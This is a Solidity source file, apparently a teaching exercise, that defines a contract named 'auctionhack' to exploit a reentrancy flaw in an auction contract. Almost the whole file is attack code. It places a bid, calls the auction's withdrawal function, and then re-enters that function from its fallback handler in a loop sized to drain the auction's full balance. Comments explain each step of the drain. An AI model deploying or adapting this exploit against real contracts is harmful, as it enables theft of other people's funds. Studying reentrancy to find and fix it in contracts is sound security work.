// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// To get the Hack working we need to call functions from the auction contract 
interface auction {
    function bid() external payable;
    function takeOut() external;
    function getBalance() external view returns(uint);
}

contract auctionhack {
    auction public auctioncontract;

    uint public loopCounter;
    uint public loop = 0;

    // Gets the address of the auction contract 
    constructor(address _address) {
        auctioncontract = auction(_address);
    }

    // takeOut2() calls the takeOut() from auction contract
    function takeOut2() public {
       
        // address(auctioncontract).balance - Look how much tokens are in the auction contract 
        // devide the auction contract balance through the Hacker bid auctioncontract.getBalance() - 1 - This checks how many times the contract holds tokens agains our bid
        // Exampl 
        // if auction contract hold 150 tokens in total and Hacker bid only 20 tokens = it devides the amount of Hacker vs auction contract in total
        // Example in numbers 150 / 20 = 7.5 => roucnded down to 7
        loopCounter = address(auctioncontract).balance / auctioncontract.getBalance() - 1;
        // The last line calculated how offten we need to call the auctioncontract.takeOut() to drain down the auction contract
        
        // auctioncontract.takeOut() calls the function takeOut from auction contract
        auctioncontract.takeOut();
    }

     // bid() calls the bid() from auction contract
    function bid() public payable {
        auctioncontract.bid{value: msg.value}();
    }

    // Possible way to receive tokens in this smart contract 
    // A fallback() can also be used in case by calling a function which isn't available  
    fallback() external payable {
        
        // Loops through the takeOut() of the auction contract as calculated in the takeOut2() to drain down the auction contract
        if (loop < loopCounter) {
            loop+=1;
            auctioncontract.takeOut();
        }
    }

    // Another possible way to receive tokens in this smart contract 
    // receive() external payable {
    //     // Remove this function for the exploit to work
    // }
}